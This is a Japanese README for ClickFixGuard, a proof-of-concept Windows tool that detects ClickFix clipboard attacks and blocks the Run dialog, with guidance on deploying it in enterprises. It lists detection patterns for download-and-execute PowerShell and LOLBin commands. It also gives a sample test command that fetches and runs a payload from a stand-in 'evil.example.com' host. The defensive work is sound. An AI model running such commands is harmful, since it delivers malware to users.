# ClickFixGuard - ClickFix攻撃検知・防御ツール

> **⚠️ 注意: 本ツールはテストプログラム（Proof of Concept）です。**
> 実環境への導入前に、十分な検証を行ってからご使用ください。
> 誤検知や環境依存の問題が発生する可能性があります。
> 本ツールの使用により生じたいかなる損害についても、作者は責任を負いません。

## ClickFix攻撃とは？

Webサイトに偽のCAPTCHAやエラー画面を表示し、ユーザーに `Win+R → Ctrl+V → Enter` の操作を指示することで、クリップボードに仕込んだ悪意あるコマンドを実行させるソーシャルエンジニアリング攻撃です。

2024年から急増し、[Recorded Future](https://www.recordedfuture.com/research/clickfix-campaigns-targeting-windows-and-macos)の報告では2025年中頃までに検出数が急増。2026年も最も活発な初期アクセス手法の一つとされています（[Stormshield](https://www.stormshield.com/news/clickfix-technique-growing-cyberthreat/)）。

### 配布されるマルウェア
Lumma Stealer, XWorm, VenomRAT, AsyncRAT, DarkGate, Danabot, NetSupport RAT, RedLine Stealer, ModeloRAT 等

## ClickFixGuardの仕組み

```
┌────────────────────┐     ┌──────────────────┐
│ ClipboardMonitor   │────▶│ ThreatPatterns   │
│ (500ms ポーリング)  │     │ (危険パターン辞書) │
└────────┬───────────┘     └──────────────────┘
         │ 危険検知
┌────────▼───────────┐
│  KeyboardHook      │
│ (Win+R / Win+X 監視)│
└────────┬───────────┘
         │ 危険クリップ + キー操作
┌────────▼───────────┐
│  WarningDialog     │  → クリップボードクリア
│ (警告表示 + 教育)   │  → 攻撃内容の可視化
└────────────────────┘
```

### 2段階検知

| 検知レベル | クリップボード内容 | Win+R/X | 動作 |
|-----------|------------------|---------|------|
| **Critical** | `powershell IEX(...)`, `mshta http://...`, Base64エンコード等 | 押された | **キーをブロック** + 赤警告ダイアログ |
| **Suspicious** | `cmd /c`, PowerShell単独起動, 実行ファイルURL等 | 押された | 黄色警告（ブロックなし） |
| **Critical** | 上記 | 押されていない | トースト通知（トレイ） |

### 検知対象パターン（調査に基づく実攻撃コマンド）

- **PowerShell系**: IEX, IWR, Invoke-Expression, Invoke-WebRequest, DownloadString, -EncodedCommand, -WindowStyle Hidden
- **LOLBin系**: mshta, bitsadmin, certutil, regsvr32, rundll32, wscript, cscript, msiexec
- **2026年新型**: nslookup (DNS型), finger.exe (CrashFix亜種)
- **汎用**: curl パイプ実行, Base64エンコード, ExecutionPolicy Bypass

---

## クイックスタート

### 前提条件
- Windows 10/11
- .NET 10 SDK（またはそれ以降）

### ビルド＆実行
```bash
git clone https://github.com/maruru3/no_ClickFix.git
cd no_ClickFix
dotnet build -c Release
dotnet run
```

起動するとシステムトレイ（画面右下）に**緑色の盾アイコン**が表示されます。

### 動作確認テスト
```powershell
# テストスクリプトで検知を確認（付属）
powershell -File test_clickfix.ps1
```

または手動で：
```powershell
# クリップボードに攻撃コマンドをセット
Set-Clipboard -Value 'powershell IEX(IWR "https://evil.example.com/payload.ps1")'
# → トレイ通知が出る
# → Win+R を押すとブロックされ、警告ダイアログが表示される
```

---

## 運用ガイド

### 個人PCでの運用

#### 1. スタートアップ登録（PC起動時に自動実行）

**方法A: スタートアップフォルダにショートカット配置**
1. ビルド: `dotnet publish -c Release -o C:\Tools\ClickFixGuard`
2. `Win+R` → `shell:startup` でスタートアップフォルダを開く
3. `C:\Tools\ClickFixGuard\ClickFixGuard.exe` のショートカットを作成して配置

**方法B: タスクスケジューラで登録**
```powershell
# 管理者権限で実行
$action = New-ScheduledTaskAction -Execute "C:\Tools\ClickFixGuard\ClickFixGuard.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "ClickFixGuard" -Action $action -Trigger $trigger -Settings $settings -Description "ClickFix攻撃検知・防御"
```

#### 2. 日常の使い方
- 起動後は**何も操作不要**。バックグラウンドで自動監視
- システムトレイの盾アイコンの色で状態を確認:
  - 🟢 **緑**: 安全（正常監視中）
  - 🟡 **黄**: 注意（不審なクリップボード内容を検知）
  - 🔴 **赤**: 危険（攻撃コマンドを検知）
- 右クリックメニューから「クリップボードを今すぐチェック」「クリップボードをクリア」が可能

#### 3. 警告が出た場合の対応
1. **まず落ち着く** — ClickFixGuardがブロック済みなので被害は出ていません
2. 警告ダイアログで**仕込まれていたコマンドの内容を確認**
3. 「**クリップボードをクリアして閉じる**」を押す（推奨）
4. 直前に開いていたWebサイトを**閉じる**（攻撃元の可能性が高い）
5. 今後そのサイトにはアクセスしない

---

### 企業・学校での運用

#### 1. 全社配布（Active Directory GPO）

**ステップ1: ビルド＆配置**
```bash
dotnet publish -c Release -r win-x64 --self-contained -o \\server\share\ClickFixGuard
```
`--self-contained` で.NETランタイムなしのPCでも動作します。

**ステップ2: GPOでスタートアップ登録**
1. グループポリシー管理コンソールを開く
2. 「ユーザーの構成」→「ポリシー」→「Windowsの設定」→「スクリプト（ログオン/ログオフ）」
3. 「ログオン」に `\\server\share\ClickFixGuard\ClickFixGuard.exe` を追加

**ステップ3: 併用推奨のGPO設定**
```
ユーザーの構成 → 管理用テンプレート → スタートメニューとタスクバー
  → 「[ファイル名を指定して実行]コマンドを[スタート]メニューから削除する」→ 有効
```
※ClickFixGuardとWin+R無効化の併用で多層防御が実現できます。
※IT管理者にはGPOフィルタリングで適用除外を設定してください。

#### 2. SCCM / Intune での配布

**Intune (Win32アプリ):**
1. `ClickFixGuard.exe` を `.intunewin` にパッケージング
2. インストールコマンド: `ClickFixGuard.exe` （バックグラウンド起動）
3. 検出ルール: ファイル `C:\Program Files\ClickFixGuard\ClickFixGuard.exe` の存在

**SCCM:**
1. アプリケーションとしてパッケージ作成
2. デプロイメントタイプ: スクリプトインストーラー
3. コレクションに対して「必須」展開

#### 3. 多層防御の組み合わせ

ClickFixGuard単体でも有効ですが、以下と組み合わせるとより堅牢です：

| 対策 | 効果 | 設定方法 |
|------|------|----------|
| **ClickFixGuard** | クリップボード監視＋キーブロック | 本ツール |
| **Win+R 無効化 (GPO)** | Runダイアログ自体を無効化 | GPO設定 |
| **PowerShell Constrained Language Mode** | スクリプト実行を制限 | `__PSLockdownPolicy = 4` |
| **AppLocker / WDAC** | 未署名スクリプトの実行防止 | GPO + ポリシー |
| **EDR (Defender for Endpoint等)** | 行動ベースの検知 | エンドポイント製品 |

#### 4. ログ・監視

現バージョンはトレイアイコンとダイアログで通知しますが、SIEMとの連携が必要な場合は `TrayApplication.cs` の `OnDangerousKeyBlocked` メソッドにイベントログ書き込みを追加できます：

```csharp
// Windows イベントログへの書き込み例
using System.Diagnostics;
EventLog.WriteEntry("ClickFixGuard",
    $"ClickFix attack blocked: {threat.Category} - {threat.Description}",
    EventLogEntryType.Warning);
```

---

### パターン追加・カスタマイズ

新しい攻撃パターンが発見された場合、`ThreatPatterns.cs` に正規表現を追加するだけで対応できます：

```csharp
// CriticalPatterns 配列に追加
(new Regex(@"新しいパターン", RegexOptions.IgnoreCase | RegexOptions.Compiled),
 "カテゴリ名", "説明文"),
```

---

## ファイル構成

| ファイル | 役割 |
|---------|------|
| `Program.cs` | エントリポイント（多重起動防止） |
| `TrayApplication.cs` | システムトレイ常駐、全コンポーネント統合 |
| `ClipboardMonitor.cs` | クリップボード定期監視 |
| `KeyboardHook.cs` | Win32低レベルキーボードフック |
| `ThreatPatterns.cs` | 危険パターン辞書（正規表現） |
| `WarningDialog.cs` | 警告ダイアログUI |
| `test_clickfix.ps1` | 動作確認テストスクリプト |

## 調査ソース

- [Microsoft Security Blog - ClickFix Analysis (2025/08)](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/)
- [Microsoft Security Blog - CrashFix Variant (2026/02)](https://www.microsoft.com/en-us/security/blog/2026/02/05/clickfix-variant-crashfix-deploying-python-rat-trojan/)
- [Palo Alto Unit42 - Preventing ClickFix](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Sekoia - ClickFix Detection](https://blog.sekoia.io/clickfix-tactic-revenge-of-detection/)
- [Fortinet - Full PowerShell Attack Chain](https://www.fortinet.com/blog/threat-research/clickfix-to-command-a-full-powershell-attack-chain)
- [Krebs on Security - ClickFix](https://krebsonsecurity.com/2025/03/clickfix-how-to-infect-your-pc-in-three-easy-steps/)
- [Dark Reading - DNS Lookup ClickFix (2026)](https://www.darkreading.com/endpoint-security/clickfix-attacks-dns-lookup-command-modelorat)
- [Kaspersky - ClickFix Variations](https://www.kaspersky.com/blog/clickfix-attack-variations/55340/)

## ライセンス

MIT
